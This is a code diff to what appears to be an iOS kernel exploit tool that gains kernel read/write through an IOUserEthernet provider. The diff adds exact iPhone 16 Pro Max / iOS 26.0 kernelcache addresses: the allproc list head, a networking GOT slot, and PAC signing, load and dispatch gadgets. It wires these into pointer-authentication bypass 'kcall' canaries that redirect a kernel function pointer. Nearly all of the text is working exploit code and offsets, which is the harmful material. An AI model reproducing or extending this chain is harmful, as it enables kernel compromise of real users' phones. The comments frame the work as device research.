@@ -3,7 +3,7 @@
 #import <IOKit/IOCFSerialize.h>
 #import <IOKit/IOKitLib.h>
 
-#include "CNDLabKernelProtocol.h"
+#include "cnd_iouserethernet_krw_layout.h"
 
 #include <dispatch/dispatch.h>
 #include <errno.h>
@@ -148,7 +148,7 @@ enum {
     CNDMax2ABERegistryEntries = 257,
 };
 
-typedef struct {
+struct CNDOptions {
     int holdSeconds;
     bool notificationTargetSwap;
     bool notificationBlockCanary;
@@ -157,7 +157,7 @@ typedef struct {
     bool ifnetCheckMultiPACCanary;
     bool ifnetKCall1PACCanary;
     bool sysctlPACCensus;
-} CNDOptions;
+};
 
 typedef struct {
     uint64_t gotAddress;
@@ -359,7 +359,7 @@ static uint64_t CNDStripInstructionPointer(uint64_t value)
 
 static bool CNDKernelObject(uint64_t value)
 {
-    return value >= CNDZoneMin && value <= CNDZoneMax &&
+    return value >= CNDLayout()->zoneMin && value <= CNDLayout()->zoneMax &&
         (value & UINT64_C(0x7)) == 0;
 }
 
@@ -1300,8 +1300,8 @@ static int CNDPrepareIfnetPACCanary(int fd, uint64_t slide,
 {
     if (canary == NULL || report == nil) return EINVAL;
     *canary = (CNDIfnetPACCanary){0};
-    canary->gotAddress = CNDStaticIOEthernetCheckMultiGOT + slide;
-    canary->canaryTarget = CNDStaticENOEXECReturn + slide;
+    canary->gotAddress = CNDLayout()->ioEthernetCheckMultiGOT + slide;
+    canary->canaryTarget = CNDLayout()->enoexecReturn + slide;
     uint32_t instructions[3] = {0};
     int result = CNDKernelRead(fd, canary->gotAddress,
         &canary->originalRaw, sizeof(canary->originalRaw));
@@ -1311,7 +1311,7 @@ static int CNDPrepareIfnetPACCanary(int fd, uint64_t slide,
     }
     canary->originalTarget = CNDStripInstructionPointer(
         canary->originalRaw);
-    uint64_t expectedOriginal = CNDStaticEtherCheckMulti + slide;
+    uint64_t expectedOriginal = CNDLayout()->etherCheckMulti + slide;
     report[@"ifnetPACGOTAddress"] = CNDHex(canary->gotAddress);
     report[@"ifnetPACGOTOriginalRaw"] = CNDHex(canary->originalRaw);
     report[@"ifnetPACGOTOriginalTarget"] =
@@ -1322,9 +1322,9 @@ static int CNDPrepareIfnetPACCanary(int fd, uint64_t slide,
     report[@"ifnetPACCanaryInstruction1"] = CNDHex(instructions[1]);
     report[@"ifnetPACCanaryInstruction2"] = CNDHex(instructions[2]);
     report[@"ifnetPACInitIfnetParams"] = CNDHex(
-        CNDStaticIOEthernetInitIfnetParams + slide);
+        CNDLayout()->ioEthernetInitIfnetParams + slide);
     report[@"ifnetPACSignerInstruction"] = CNDHex(
-        CNDStaticIOEthernetCheckMultiSigner + slide);
+        CNDLayout()->ioEthernetCheckMultiSigner + slide);
     report[@"ifnetPACDiscriminator"] = @"0xe4fe";
 
     if (result != 0 || canary->originalRaw != expectedOriginal ||
@@ -2038,9 +2038,9 @@ static int CNDRunIfnetKCall1PACCanary(int fd, uint64_t slide,
     }
     CNDIfnetPACCanary signer = {0};
     int result = CNDPrepareIfnetPACCanary(fd, slide, &signer, report);
-    uint64_t stockTarget = CNDStaticEtherCheckMulti + slide;
-    uint64_t loadTarget = CNDStaticLoadW0FromX0 + slide;
-    uint64_t dispatcherTarget = CNDStaticIfnetX0Dispatcher + slide;
+    uint64_t stockTarget = CNDLayout()->etherCheckMulti + slide;
+    uint64_t loadTarget = CNDLayout()->loadW0FromX0 + slide;
+    uint64_t dispatcherTarget = CNDLayout()->ifnetX0Dispatcher + slide;
     uint32_t loadInstructions[3] = {0};
     uint32_t dispatcherInstructions[7] = {0};
     if (result == 0) {
@@ -2252,13 +2252,13 @@ int main(int argc, const char *argv[])
         CNDOptions options = {0};
         uint64_t debuggerLoadAddress = 0;
         uint64_t donorPIDValue = 0;
-        if (!CNDParseOptions(argc, argv, &options) || !CNDParseU64(
-                argc > 2 ? argv[2] : NULL, &debuggerLoadAddress) ||
+        if (!CNDParseOptions(argc, argv, &options) ||
+                !CNDParseBaseArgument(argc, argv, &debuggerLoadAddress) ||
             !CNDParseU64(argc > 3 ? argv[3] : NULL, &donorPIDValue) ||
             donorPIDValue <= 1 || donorPIDValue > INT32_MAX ||
-            debuggerLoadAddress < CNDStaticKernelBase) {
+            (!CNDAutoBase && !CNDSelectLayoutForBase(debuggerLoadAddress))) {
             fprintf(stderr, "usage: cnd_iouserethernet_krw_trigger "
-                "SOCKET EXPECTED_BASE BLUETOOTHD_PID "
+                "SOCKET <EXPECTED_BASE|auto> BLUETOOTHD_PID "
                 "[--notification-target-swap | "
                 "--notification-block-canary | "
                 "--notification-sandbox-canary | "
@@ -2333,10 +2333,10 @@ int main(int argc, const char *argv[])
                 0, NULL, 0, &observedBase);
         }
         report[@"providerCapabilities"] = CNDHex(capabilities);
+        CNDResolveBaseArgument(&debuggerLoadAddress, observedBase);
         report[@"debuggerLoadAddress"] = CNDHex(debuggerLoadAddress);
         report[@"observedKernelBase"] = CNDHex(observedBase);
-        struct mach_header_64 filesetHeader = {0};
-        struct mach_header_64 debuggerHeader = {0};
+        struct mach_header_64 filesetHeader = {0}, debuggerHeader = {0};
         if (result == 0) {
             result = CNDKernelRead(fd, observedBase,
                 &filesetHeader, sizeof(filesetHeader));
@@ -2364,10 +2364,10 @@ int main(int argc, const char *argv[])
             return 1;
         }
 
-        uint64_t slide = observedBase - CNDStaticKernelBase;
-        report[@"kernelSlide"] = CNDHex(slide);
-        if (slide >= UINT64_C(0x100000000)) {
-            report[@"result"] = @"kernel-slide-refused";
+        uint64_t slide = observedBase - CNDLayout()->kernelBase;
+        CNDReportLayout(report, slide);
+        if (!CNDLayoutAccepts(slide, &options)) {
+            report[@"result"] = CNDLayoutRefusal(slide, &options);
             CNDPrintReport(report);
             close(fd);
             return 1;
@@ -2381,7 +2381,7 @@ int main(int argc, const char *argv[])
         }
 
         uint64_t allProcHead = 0;
-        result = CNDKernelRead(fd, CNDStaticAllProc + slide,
+        result = CNDKernelRead(fd, CNDLayout()->allProc + slide,
             &allProcHead, sizeof(allProcHead));
         uint32_t selfVisited = 0;
         uint32_t donorVisited = 0;
@@ -2922,4 +2922,224 @@ int main(int argc, const char *argv[])
         if (criticalIfnetPACRestoreFailure) return 2;
         return success ? 0 : 1;
     }
+}
+
+/*
+ * Exact iPhone17,2 (iPhone 16 Pro Max) / iOS 26.0 23A341 kernelcache layout.
+ *
+ * CNDSelectLayoutForBase picks this layout when the base -- EXPECTED_BASE,
+ * or the provider's own KBase answer when the argument is `auto` -- lies in
+ * the phone's static space (at or above CNDStaticPhoneKernelBase); any lower
+ * base keeps the vPhone constants above, unchanged.  Each value is a static
+ * derivation against the pinned phone kernelcache (UUID
+ * 76BB58BF-911D-07E4-D681-DCE7F2DDA3CE), recorded with its witnesses and
+ * its VM self-check (one record file per role) in
+ * docs/research/kcall1-phone-derivation-20261016/.  Level: implemented.
+ * Nothing here has run on the phone; a live run whose report passes the
+ * shared validator is what would make any of it physical-proved.
+ *
+ * No address is guessed.  An element with no derivation record is
+ * CNDUnresolvedStatic, and CNDLayoutAccepts refuses the whole layout while
+ * any element is unresolved (result "kernel-layout-incomplete"), before any
+ * layout-derived kernel read.  Only --ifnet-kcall1-pac-canary is ported to
+ * this layout; every other mode is refused ("kernel-layout-mode-refused").
+ */
+static const uint64_t CNDUnresolvedStatic = UINT64_C(0);
+/* Kernelcache container __TEXT vmaddr (phone-kernelcache-header.txt:6). */
+static const uint64_t CNDStaticPhoneKernelBase =
+    UINT64_C(0xfffffff007004000);
+/*
+ * allproc list head: the unique proc_iterate-shaped function's bit-0
+ * (PROC_ALLPROCLIST) guarded 64-bit head load, zombproc at +8, which is
+ * _proc_iterate in the symbol map (phone-allproc-find.txt:125-128,213-217);
+ * the same scan reproduces the vPhone pin CNDStaticAllProc (:10-13,89-94).
+ */
+static const uint64_t CNDStaticPhoneAllProc =
+    UINT64_C(0xfffffff00b2faa18);
+/*
+ * Kernel-object window the repo's physical probe pins for this phone
+ * (cnd_physical_cs_allow_invalid_probe.m:39-40, CND_KERNEL_OBJECT_MIN/MAX).
+ */
+static const uint64_t CNDStaticPhoneZoneMin =
+    UINT64_C(0xffffffdc00000000);
+static const uint64_t CNDStaticPhoneZoneMax =
+    UINT64_C(0xfffffffbffffffff);
+/*
+ * IONetworkingFamily __got slot read by initIfnetParams+0x1b0; raw chained
+ * fixup 0x1000000148c44c (phone-kext-find.txt:151-156).
+ */
+static const uint64_t CNDStaticPhoneIOEthernetCheckMultiGOT =
+    UINT64_C(0xfffffff0080b4020);
+/*
+ * ether_check_multi: a `bti c` landing pad followed by the VM body
+ * instruction for instruction (phone-kernel-find.txt:23-52); independently
+ * the container base + the __got fixup offset 0x148c44c.
+ */
+static const uint64_t CNDStaticPhoneEtherCheckMulti =
+    UINT64_C(0xfffffff00849044c);
+/* IOEthernetInterface::initIfnetParams, 492 bytes (phone-kext-find.txt:4). */
+static const uint64_t CNDStaticPhoneIOEthernetInitIfnetParams =
+    UINT64_C(0xfffffff00a6da548);
+/*
+ * initIfnetParams+0x1b8: mov x17, #0xe4fe; pacia x16, x17;
+ * str x16, [x19, #0x48] (phone-kext-find.txt:150).
+ */
+static const uint64_t CNDStaticPhoneIOEthernetCheckMultiSigner =
+    UINT64_C(0xfffffff00a6da700);
+/*
+ * bti c; mov w0, #ENOEXEC; ret: element 6 of the 13-element outline run
+ * (phone-kernel-find.txt:62-69).
+ */
+static const uint64_t CNDStaticPhoneENOEXECReturn =
+    UINT64_C(0xfffffff008a4b5d8);
+/*
+ * bti c; ldr w0, [x0]; ret: element 2 of the 6-element outline run
+ * (phone-kernel-find.txt:54-61).
+ */
+static const uint64_t CNDStaticPhoneLoadW0FromX0 =
+    UINT64_C(0xfffffff008a4b130);
+/*
+ * bti c; x16=[x0+0xb0]; x0=[x0+0x90]; braa x16, IA/0xe4fe
+ * (phone-kext-find.txt:160-172).
+ */
+static const uint64_t CNDStaticPhoneIfnetX0Dispatcher =
+    UINT64_C(0xfffffff00a6e759c);
+
+static const CNDKernelLayout CNDVPhoneLayout = {
+    .name = "vphone-23A341",
+    .kernelBase = CNDStaticKernelBase,
+    .allProc = CNDStaticAllProc,
+    .zoneMin = CNDZoneMin,
+    .zoneMax = CNDZoneMax,
+    .ioEthernetCheckMultiGOT = CNDStaticIOEthernetCheckMultiGOT,
+    .etherCheckMulti = CNDStaticEtherCheckMulti,
+    .ioEthernetInitIfnetParams = CNDStaticIOEthernetInitIfnetParams,
+    .ioEthernetCheckMultiSigner = CNDStaticIOEthernetCheckMultiSigner,
+    .enoexecReturn = CNDStaticENOEXECReturn,
+    .loadW0FromX0 = CNDStaticLoadW0FromX0,
+    .ifnetX0Dispatcher = CNDStaticIfnetX0Dispatcher,
+    .kcall1Only = false,
+};
+
+static const CNDKernelLayout CNDPhoneLayout = {
+    .name = "iphone17,2-23A341",
+    .kernelBase = CNDStaticPhoneKernelBase,
+    .allProc = CNDStaticPhoneAllProc,
+    .zoneMin = CNDStaticPhoneZoneMin,
+    .zoneMax = CNDStaticPhoneZoneMax,
+    .ioEthernetCheckMultiGOT = CNDStaticPhoneIOEthernetCheckMultiGOT,
+    .etherCheckMulti = CNDStaticPhoneEtherCheckMulti,
+    .ioEthernetInitIfnetParams = CNDStaticPhoneIOEthernetInitIfnetParams,
+    .ioEthernetCheckMultiSigner = CNDStaticPhoneIOEthernetCheckMultiSigner,
+    .enoexecReturn = CNDStaticPhoneENOEXECReturn,
+    .loadW0FromX0 = CNDStaticPhoneLoadW0FromX0,
+    .ifnetX0Dispatcher = CNDStaticPhoneIfnetX0Dispatcher,
+    .kcall1Only = true,
+};
+
+static const CNDKernelLayout *CNDSelectedLayout = &CNDVPhoneLayout;
+
+static bool CNDSelectLayoutForBase(uint64_t expectedBase)
+{
+    if (expectedBase >= CNDPhoneLayout.kernelBase) {
+        CNDSelectedLayout = &CNDPhoneLayout;
+        return true;
+    }
+    CNDSelectedLayout = &CNDVPhoneLayout;
+    return expectedBase >= CNDVPhoneLayout.kernelBase;
+}
+
+static const CNDKernelLayout *CNDLayout(void)
+{
+    return CNDSelectedLayout;
+}
+
+static const char *CNDLayoutUnresolvedElement(const CNDKernelLayout *layout)
+{
+    const struct { const char *name; uint64_t value; } elements[] = {
+        {"kernelBase", layout->kernelBase},
+        {"allProc", layout->allProc},
+        {"zoneMin", layout->zoneMin},
+        {"zoneMax", layout->zoneMax},
+        {"ioEthernetCheckMultiGOT", layout->ioEthernetCheckMultiGOT},
+        {"etherCheckMulti", layout->etherCheckMulti},
+        {"ioEthernetInitIfnetParams", layout->ioEthernetInitIfnetParams},
+        {"ioEthernetCheckMultiSigner", layout->ioEthernetCheckMultiSigner},
+        {"enoexecReturn", layout->enoexecReturn},
+        {"loadW0FromX0", layout->loadW0FromX0},
+        {"ifnetX0Dispatcher", layout->ifnetX0Dispatcher},
+    };
+    for (size_t index = 0;
+         index < sizeof(elements) / sizeof(elements[0]); index++) {
+        if (elements[index].value == CNDUnresolvedStatic) {
+            return elements[index].name;
+        }
+    }
+    return NULL;
+}
+
+static bool CNDLayoutAccepts(uint64_t slide, const CNDOptions *options)
+{
+    if (slide >= UINT64_C(0x100000000)) return false;
+    if (CNDLayoutUnresolvedElement(CNDLayout()) != NULL) return false;
+    return !CNDLayout()->kcall1Only || options->ifnetKCall1PACCanary;
+}
+
+static NSString *CNDLayoutRefusal(uint64_t slide, const CNDOptions *options)
+{
+    if (slide >= UINT64_C(0x100000000)) return @"kernel-slide-refused";
+    if (CNDLayoutUnresolvedElement(CNDLayout()) != NULL) {
+        return @"kernel-layout-incomplete";
+    }
+    if (CNDLayout()->kcall1Only && !options->ifnetKCall1PACCanary) {
+        return @"kernel-layout-mode-refused";
+    }
+    return @"kernel-slide-refused";
+}
+
+static void CNDReportLayout(NSMutableDictionary<NSString *, id> *report,
+    uint64_t slide)
+{
+    report[@"kernelSlide"] = CNDHex(slide);
+    report[@"kernelLayout"] = @(CNDLayout()->name);
+    const char *unresolved = CNDLayoutUnresolvedElement(CNDLayout());
+    if (unresolved != NULL) {
+        report[@"kernelLayoutUnresolved"] = @(unresolved);
+    }
+}
+
+/*
+ * EXPECTED_BASE argument handling (cnd_iouserethernet_krw_layout.h).  The
+ * positional slot is always present; the literal `auto` (or `-`) leaves the
+ * base to the provider's own KBase answer, while a 16-hex-digit address is
+ * the explicit expectation as before.  Under `auto` the phone's live kernel
+ * state is the authority, the way the physical RX probe resolves
+ * g_kernel_base/g_kernel_slide on-device
+ * (cnd_physical_cs_allow_invalid_probe.m:385-386,420).  An explicit address
+ * is still checked against the kernel text the provider reads back
+ * (matchingBootLayout), so the VM flow is unchanged.
+ */
+static bool CNDParseBaseArgument(int argc, const char *argv[],
+    uint64_t *base)
+{
+    if (argc <= 2) {
+        return false;
+    }
+    const char *argument = argv[2];
+    if (strcmp(argument, "auto") == 0 || strcmp(argument, "-") == 0) {
+        CNDAutoBase = true;
+        *base = 0;
+        return true;
+    }
+    CNDAutoBase = false;
+    return CNDParseU64(argument, base);
+}
+
+static void CNDResolveBaseArgument(uint64_t *base, uint64_t observedBase)
+{
+    if (!CNDAutoBase) {
+        return;
+    }
+    *base = observedBase;
+    (void)CNDSelectLayoutForBase(observedBase);
 }
